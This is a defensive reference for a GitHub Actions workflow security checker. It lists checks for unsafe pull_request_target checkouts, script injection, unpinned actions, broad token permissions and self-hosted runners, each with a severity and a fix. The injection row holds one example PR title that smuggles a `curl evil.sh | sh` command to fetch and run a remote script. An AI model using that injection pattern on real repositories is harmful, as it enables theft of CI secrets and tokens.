# Checks reference

| Check id | Severity | Why it matters | Fix |
| --- | --- | --- | --- |
| `prt.checkout_pr_code` | critical (checkout) / high (run step) | `pull_request_target` and `workflow_run` run in the base repository context with secrets and a write-capable `GITHUB_TOKEN`. Checking out `github.event.pull_request.head.sha` / `head.ref` / `refs/pull/N` or running `gh pr checkout` executes attacker code there (build scripts, `npm install` hooks, test files). | Build untrusted code in a `pull_request` workflow (no secrets, read token). If you need to comment or label, do it in a separate `workflow_run` workflow that only downloads artifacts and treats their content as data. |
| `prt.trigger` | info | Not wrong by itself (labelers, welcome bots), but every step must treat the PR as hostile. | Keep it for metadata-only jobs; never check out PR code. |
| `injection.run` | high | `${{ }}` is expanded **before** the shell runs, so a PR titled `a"; curl evil.sh | sh; echo "` becomes code. Untrusted: issue/PR/discussion title and body, comment and review bodies, commit messages and author names/emails, `head_ref`, `pull_request.head.ref`/`label`, wiki page names, `workflow_run.head_branch`. | Put the value in `env:` and reference `"$VAR"` (quoted) in the script. |
| `injection.script` | high | Same for `actions/github-script`: the expression becomes JavaScript source. | Read from `context.payload.pull_request.title` inside the script, or `process.env.TITLE`. |
| `injection.input` | low | `inputs.*`, `steps.*.outputs.*`, `needs.*.outputs.*` are only as trusted as their source (a `workflow_dispatch` user, a step that echoed a branch name). | Same env indirection; validate format (`[[ "$V" =~ ^[0-9.]+$ ]]`). |
| `action.unpinned` | high (third-party tag, any branch) / low (first-party tag) | Tags and branches are mutable. A compromised maintainer account can move `v2` to malicious code that reads your secrets (the 2025 tj-actions/changed-files incident did exactly this). | `uses: owner/repo@<40-char commit SHA> # v2.3.1`, kept fresh by Dependabot. Use `--strict` to treat `actions/*` and `github/*` the same. |
| `action.docker_unpinned` | medium | `docker://image:tag` can be re-pushed. | `docker://image@sha256:<digest>`. |
| `permissions.missing` | medium | Without `permissions`, the token gets the repository or organization default, which is read-write on older repositories. | Top-level `permissions: contents: read`; grant writes per job. |
| `permissions.write_all` | high | Every scope writable: releases, packages, workflows (if allowed), issues. | List the scopes needed. |
| `permissions.broad` | low | Workflow-level writes reach every job, including the ones running third-party actions. | Move writes into the job. |
| `secrets.workflow_env` | medium | Workflow-level `env` is visible to every step of every job, including all third-party actions and anything they spawn. | Step-level `env:` or `with:` for the single step that needs it. |
| `secrets.inherit` | low | Passes all repository/org secrets to the called workflow. | Declare `secrets:` in the called workflow and pass them by name. |
| `runner.self_hosted` | high with `--public`, medium with PR triggers, info otherwise | Fork PRs on a public repo can run arbitrary code on a persistent machine (network access, leftover credentials, cache poisoning). | GitHub-hosted runners for public repos; otherwise ephemeral/JIT runners, a runner group restricted to private repos, "Require approval for all outside collaborators". |
| `commands.unsecure` | high | Re-enables the deprecated `set-env`/`add-path` workflow commands that any log line can trigger. | Remove; write to `$GITHUB_ENV` / `$GITHUB_PATH` with care. |

## Known limits

- Line numbers are best effort (first matching line after the previous match).
- Expressions built in other ways (`format()`, `toJSON(github.event)`) are matched only if
  the untrusted path appears literally; `toJSON(github.event)` piped into a shell is still
  dangerous - check by hand.
- The script does not know repository settings (default token permissions, fork PR
  approval policy, environment protection rules). Ask the user or check the settings page.
- It does not follow reusable workflows across repositories.

## Complementary tools

- [actionlint](https://github.com/rhysd/actionlint): syntax, expression types, shellcheck on `run:`.
- [zizmor](https://github.com/zizmorcore/zizmor): deeper static analysis (template injection,
  artipacked credential persistence, cache poisoning).
- OpenSSF Scorecard: repository-level supply-chain score.
